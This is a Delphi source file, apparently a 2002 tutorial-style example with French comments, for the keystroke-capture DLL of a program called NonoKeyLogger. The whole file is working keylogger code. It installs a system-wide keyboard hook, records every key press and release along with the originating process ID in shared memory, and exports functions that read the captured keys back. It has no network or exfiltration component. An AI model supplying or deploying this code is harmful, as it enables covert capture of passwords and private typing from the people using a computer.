library DllHook;
//
// Sujet : Librairie de capture des touches pour le programme NonoKeyLogger
//
// Par Nono40 : http://nono40.developpez.com   http://nono40.fr.st
//              mailTo:nono40@fr.st
//
// Le 18/08/2002
//

uses
  SysUtils,Windows,Classes;

{$R *.res}

// Définition d'un buffer intermédiaire de stockage des touches
// 127 touches maxi en attente de lecture pas GetNextKey()
Type
  PKeyBuffer = ^TKeyBuffer;
  TKeyBuffer = Record
    kbIN  :Integer;
    kbOUT :Integer;
    kbKEY :Array[0..127] of Integer;
    kbID  :Array[0..127] of Integer;
  End;

// Handle des accès aux Hook et FileMapping par l'application principale
// Ces données bien que globales ne sont pas accessible par les autres
// process. Elles ne peuvent donc pas être utilisées par la fonction
// CallBack du hook.
Var
  HandleHook  :Integer    =0;
  HandleFile  :Integer    =0;
  Pointeur    :PKeyBuffer =Nil;

// Fonction CallBack du hook placé sur le clavier. Les touches lues sont placées
// dans le buffer pour être ensuite lues par la fonction GetNextKey().
Function KeyboardHook(code: Integer; wparam: WPARAM; lparam: LPARAM): LRESULT stdcall;
Var HandleFileLocal:Integer;
    PointeurLocal  :PKeyBuffer;
    Adresse        :Integer;
Begin
  // Il faut penser que cette fonction s'exécute dans chaque process actif.
  // Les données globales de la dll ne sont donc pas accessibles. Le file
  // mapping permet de palier à ce problème en offre un espace mémoire
  // facile d'accès en n'en connaissant que le nom.
  HandleFileLocal:=OpenFileMapping(FILE_MAP_WRITE,False,'KEYHOOK');
  If HandleFileLocal<>0
  Then Begin
    PointeurLocal:=PKeyBuffer(MapViewOfFile(HandleFileLocal,FILE_MAP_WRITE,0,0,0));
    If PointeurLocal<>Nil
    Then Begin
      // Une fois le FileMapping effectué, le buffer est en accès direct, on ajoute
      // alors la nouvelle touche à la suite de la file
      // WParam contient le code de touche virtuel
      // Le bit 31 de LParam est à 0 pour un KeyDown et à 1 pour un KeyUp
      Adresse:=(PointeurLocal^.kbIN+1)And 127;
      PointeurLocal^.kbID [Adresse]:=GetCurrentProcessId;
      PointeurLocal^.kbKEY[Adresse]:=(WParam And $0000FFFF)+(LParam And Longint($80000000));
      PointeurLocal^.kbIN          :=Adresse;
      UnMapViewOfFile(PointeurLocal);
    End;
    CloseHandle(HandleFileLocal);
  End;
  Result:=CallNextHookEx(HandleHook,code,wparam,lparam);
End;

// Procédure d'initialisation du Hook et de création du FileMapping
// Elle doit être appelée une fois et une seule en début de votre application
Function StartHook:Boolean;StdCall;
begin
  HandleFile:=CreateFileMapping
    ($FFFFFFFF                   // Handle mémoire => partage de mémoire et non de fichier
    ,NIL                         // Sécurité par défaut
    ,PAGE_READWRITE              // Accès en lecture/écriture
    ,0                           // Taille de la zone partagée   HIGH
    ,SizeOf(TKeyBuffer)          // Taille de la zone partagée   LOW
    ,'KEYHOOK'  );               // Nom du partage

  If HandleFile<>0
    Then Pointeur:=PKeyBuffer(MapViewOfFile
      (HandleFile                // Handle obtenu par CreateFileMapping
      ,FILE_MAP_WRITE            // Accès en lecture/écriture
      ,0                         // Pas d'offset
      ,0                         // Pas d'offset
      ,0));                      // Mapping de tout le fichier

  If Pointeur<>Nil
  Then Begin
    Pointeur^.kbIN  :=0;         // Initialisation de la file d'attente
    Pointeur^.kbOUT :=0;
  End;
  HandleHook:=SetWindowsHookEx
    (WH_KEYBOARD                 // Type de HOOK utilisé ( sur le clavier ici )
    ,KeyboardHook                // Adresse de la fonction CallBack qui sera appelée
    ,hInstance                   // Handle de la dll demandant le Hook
    ,0);                         // Pas d'ID Thread, car on veut un Hook système
  Result:=(HandleHook<>0) And (HandleFile<>0) And (Pointeur<>Nil);
End;

// Procédure de fermeture du Hook
// Doit être appelée en fin d'application
Function StopHook:Boolean;StdCall;
Begin
  Result:=True;
  If Pointeur<>Nil Then UnMapViewOfFile(Pointeur);               // Libération du mapping
  If HandleFile<>0 Then CloseHandle(HandleFile);                 // Fermeture du fichier
  If HandleHook<>0 Then Result:=UnHookWindowsHookEx(HandleHook); // Suppression du Hook
End;

// Procédure de lecture du buffer des touches par l'application.
// Chaque appel de la fonction envoi la touche suivante. La fonction
// renvoi True si une touche est effectivement disponible dans le buffer.
// Dans ce cas Key contient le code virtuel de la touche
// avec en plus dans le bit 31 de key, l'état KeyUP/KeyDown.
// Si le buffer est vide, la fonction renvoie False.
Function GetNextKey(Var Key,ID:Integer):Boolean;StdCall;
Var Adresse:Integer;
Begin
  If Pointeur^.kbIN<>Pointeur^.kbOUT
  Then Begin
    Adresse:=(Pointeur^.kbOUT+1)And 127;
    ID  := Pointeur^.kbID [Adresse];
    Key := Pointeur^.kbKEY[Adresse];
    Pointeur^.kbOUT := Adresse;
    Result:=True;
  End
  Else Result:=False;
End;

Exports StartHook,StopHook,GetNextKey;

end.
